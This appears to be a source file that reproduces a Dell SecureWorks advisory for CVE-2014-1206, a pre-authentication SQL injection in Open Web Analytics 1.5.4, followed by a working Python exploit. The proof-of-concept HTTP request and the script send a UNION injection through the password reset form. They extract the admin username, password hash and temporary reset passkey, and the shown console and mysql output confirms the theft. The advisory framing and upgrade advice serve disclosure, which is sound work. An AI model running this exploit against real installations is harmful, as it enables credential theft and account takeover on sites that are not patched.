@@ -1,0 +1,232 @@
+"""
+Dell SecureWorks Security Advisory SWRX-2014-001
+Open Web Analytics Pre-Auth SQL Injection
+
+Advisory Information
+Title: Open Web Analytics Pre-Auth SQL Injection
+Advisory ID: SWRX-2014-001
+Advisory URL: http://www.secureworks.com/cyber-threat-intelligence/advisories/SWRX-2014-001/
+Date published: Thursday, January 9, 2014
+CVE: CVE-2014-1206
+CVSS v2 base score: 7.5
+Date of last update: Wednesday, January 8, 2014
+Vendors contacted: Open Web Analytics
+Release mode: Coordinated
+Discovered by: Dana James Traversie, Dell SecureWorks
+
+Summary
+Open Web Analytics (OWA) is open source web analytics software that can track and analyze how visitors use websites and applications. OWA is vulnerable to SQL injection that allows an attacker to execute arbitrary SQL statements in the context of the configured OWA database user without authenticating to the web application.
+
+Affected products
+This vulnerability affects Open Web Analytics v1.5.4.
+
+Vendor Information, Solutions, and Workarounds
+The vendor has released an updated version to address this vulnerability. OWA users should upgrade to version v1.5.5 or later.
+
+Details
+An SQL injection vulnerability exists in Open Web Analytics v1.5.4 due to insufficient input validation of the ‘owa_email_address’ parameter on the password reset page. The password reset page does not require user authentication. A remote attacker can leverage this issue to execute arbitrary SQL statements in the context of the configured OWA database user. The impact of the vulnerability varies based on the deployment and configuration of the OWA, database, and web server software. Successful exploitation could result in complete loss of confidentiality, integrity, and availability in the OWA database and may affect the entire underlying database management system. This issue could also lead to operating system compromise under the right conditions.
+
+CVSS severity (version 2.0)
+Access vector: Network
+Access complexity: Low
+Authentication: None
+Impact type: Manipulation of SQL queries and execution of arbitrary SQL commands on the underlying
+database
+Confidentiality impact: Partial
+Integrity impact: Partial
+Availability impact: Partial
+CVSS v2 base score: 7.5
+CVSS v2 impact subscore: 6.4
+CVSS v2 exploitability subscore: 10
+CVSS v2 vector: (AV:N/AC:L/Au:N/C:P/I:P/A:P)
+
+Proof of concept
+
+Request:
+
+POST /owa/index.php?owa_do=base.passwordResetForm HTTP/1.1
+Host: 10.11.28.70
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.11.28.70/owa/index.php?owa_do=base.passwordResetForm
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 296
+
+owa_email_address=-4534%27+UNION+ALL+SELECT+3627%2C3627%2C3627%2C3627%2C3627%2CCONCAT%280x7177766871%2CIFNULL%28CAST%28password+AS+CHAR%29%2C0x20%29%2C0x7176627971%29%2C3627%2C3627%2C3627%2C3627+FROM+owa.owa_user+LIMIT+0%2C1%23&owa_action=base.passwordResetRequest&owa_submit=Request+New+Password
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Fri, 14 Feb 2014 17:03:43 GMT
+Server: Apache/2.2.15 (Red Hat)
+X-Powered-By: PHP/5.3.3
+Content-Length: 3538
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+Invalid address: qwvhqe2744931d91565ed5b44a1d52746afa0qvbyq<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+    <title> - Open Web Analytics</title>
+    <!-- HEAD Elements -->
+..
+
+The password hash of the admin user included in the response: e2744931d91565ed5b44a1d52746afa0
+
+Revision history
+1.0 2014-01-09: Initial advisory release
+
+PGP keys
+This advisory has been signed with the Dell SecureWorks Counter Threat Unit™ PGP key, which is
+available for download at http://www.secureworks.com/SecureWorksCTU.asc.
+
+About Dell SecureWorks
+Dell Inc. (NASDAQ: DELL) listens to customers and delivers worldwide innovative technology and business solutions they trust and value. Recognized as an industry leader by top analysts, Dell SecureWorks provides world-class information security services to help organizations of all sizes protect their IT assets, comply with regulations and reduce security costs.
+
+Disclaimer
+Copyright © 2014 Dell SecureWorks
+This advisory may not be edited or modified in any way without the express written consent of Dell SecureWorks. Permission is hereby granted to link to this advisory via the Dell SecureWorks website or use in accordance with the fair use doctrine of U.S. copyright laws. See the Dell SecureWorks terms of use at http://www.secureworks.com/contact/terms_of_use/ for additional information.
+The most recent version of this advisory may be found on the Dell SecureWorks website at www.secureworks.com. The contents of this advisory may change or be removed from the website without notice. Use of this information constitutes acceptance for use in an AS IS condition. There are NO warranties, implied or otherwise, with regard to this information or its use. ANY USE OF THIS INFORMATION IS AT THE USER'S RISK. In no event shall Dell SecureWorks be liable for any damages whatsoever arising out of or in connection with the use or further publication or disclosure of this information.
+"""
+#!/usr/bin/env python
+
+import argparse
+import re
+import time
+import urllib
+import urllib2
+
+argParser = argparse.ArgumentParser(description='Open Web Analytics v1.5.4 Wicked Awesome SQLi Exploit')
+argParser.add_argument("-t", dest="target", help="The target OWA base server URL (e.g. http://owa.example.com/)", required=True)
+argParser.add_argument("-o", dest="offset", help="The offset (zero-based) used in the 'LIMIT' portion of the underlying SQL query used to extract column data", type=int, required=True)
+argParser.add_argument("-d", dest="dbname", help="The target OWA database name (e.g. 'owa' is the default)", required=False)
+argParser.add_argument("-u", dest="user", help="Extract the value of the 'user_id' column from the 'owa_user' table", action='store_true', default=False, required=False)
+argParser.add_argument("-p", dest="password", help="Extract the value of the 'password' column from the 'owa_user' table", action='store_true', default=False, required=False)
+argParser.add_argument("-r", dest="passkey", help="Extract the value of the 'temp_passkey' column from the 'owa_user' table", action='store_true', default=False, required=False)
+
+args = argParser.parse_args()
+
+database_name = 'owa'
+user_table_name = 'owa_user'
+
+user_column_name = 'user_id'
+pass_column_name = 'password'
+temp_passkey_column_name = 'temp_passkey'
+
+result_pattern = re.compile('Invalid\saddress:\sqwvhq(.+)qvbyq')
+
+def fetchColumnData(colname, offset):
+     print "\nFetching data from the '" + colname + "' column at offset %i:\n" % offset
+     url = args.target + 'index.php?owa_do=base.passwordResetForm'
+     params = { 'owa_email_address' : "-4534' UNION ALL SELECT 3627,3627,3627,3627,3627,CONCAT(0x7177766871,IFNULL(CAST(" + colname + " AS CHAR),0x20),0x7176627971),3627,3627,3627,3627 FROM " + database_name + "." + user_table_name + " LIMIT %i,1#" % offset,
+                'owa_action' : 'base.passwordResetRequest',
+                'owa_submit' : 'Request New Password' }
+     url_encoded_params = urllib.urlencode(params)
+     req = urllib2.Request(url, url_encoded_params)
+     try:
+          resp = urllib2.urlopen(req)
+          resp_html = resp.read()
+          print result_pattern.findall(resp_html)
+     except urllib2.HTTPError as e:
+          print 'Caught execption while sending HTTP request to target'
+          print 'Verify target is vulnerable and URL information is accurate\n'
+          print 'Server response: %i\n' % e.code
+
+print '*************************************'
+print '***** Open Web Analytics v1.5.4 *****'
+print '**** Wicked Awesome SQLi Exploit ****'
+print '******* Dana James Traversie ********'
+print '**** Security Systems Sr. Advisor ***'
+print '********** Dell SecureWorks *********'
+print '*************************************'
+
+print '\nTargeting Open Web Analytics install at:\n'
+print "['" + args.target + "']"
+
+if (args.dbname):
+     database_name = args.dbname
+
+print "\nTarget database and table combination:\n"
+print "['" + database_name + "." + user_table_name + "']"
+
+if (args.user):
+    fetchColumnData(colname=user_column_name, offset=args.offset)
+
+if (args.password):
+    fetchColumnData(colname=pass_column_name, offset=args.offset)
+
+if (args.passkey):
+    fetchColumnData(colname=temp_passkey_column_name, offset=args.offset)
+
+"""
+root@kali:~/Exploits# ./owa-v1.5.4-sqli-exploit.py -h
+usage: owa-v1.5.4-sqli-exploit.py [-h] -t TARGET -o OFFSET [-d DBNAME] [-u]
+                                  [-p] [-r]
+
+Open Web Analytics v1.5.4 Wicked Awesome SQLi Exploit
+
+optional arguments:
+  -h, --help  show this help message and exit
+  -t TARGET   The target OWA base server URL (e.g. http://owa.example.com/)
+  -o OFFSET   The offset (zero-based) used in the 'LIMIT' portion of the
+              underlying SQL query used to extract column data
+  -d DBNAME   The target OWA database name (e.g. 'owa' is the default)
+  -u          Extract the value of the 'user_id' column from the 'owa_user'
+              table
+  -p          Extract the value of the 'password' column from the 'owa_user'
+              table
+  -r          Extract the value of the 'temp_passkey' column from the
+              'owa_user' table
+root@kali:~/Exploits#
+
+root@kali:~/Exploits# ./owa-v1.5.4-sqli-exploit.py -t http://localhost/owa154/ -d owa154 -o 0 -u -p -r
+*************************************
+***** Open Web Analytics v1.5.4 *****
+**** Wicked Awesome SQLi Exploit ****
+******* Dana James Traversie ********
+**** Security Systems Sr. Advisor ***
+********** Dell SecureWorks *********
+*************************************
+
+Targeting Open Web Analytics install at:
+
+['http://localhost/owa154/']
+
+Target database and table combination:
+
+['owa154.owa_user']
+
+Fetching data from the 'user_id' column at offset 0:
+
+['admin']
+
+Fetching data from the 'password' column at offset 0:
+
+['6b4754709eef21844ea2b67fce2ebe23']
+
+Fetching data from the 'temp_passkey' column at offset 0:
+
+['0b54dbf880d10290d7db4fad0a88a956']
+root@kali:~/Exploits#
+
+mysql> select * from owa154.owa_user\G
+*************************** 1. row ***************************
+              id: 1
+         user_id: admin
+        password: 6b4754709eef21844ea2b67fce2ebe23
+            role: admin
+       real_name: 
+   email_address: dtraversie@secureworks.com
+    temp_passkey: 0b54dbf880d10290d7db4fad0a88a956
+   creation_date: 1434465867
+last_update_date: 1434465867
+         api_key: c4da36a4a4c1991711f91655083c87bb
+1 row in set (0.00 sec)
+
+mysql>
+"""
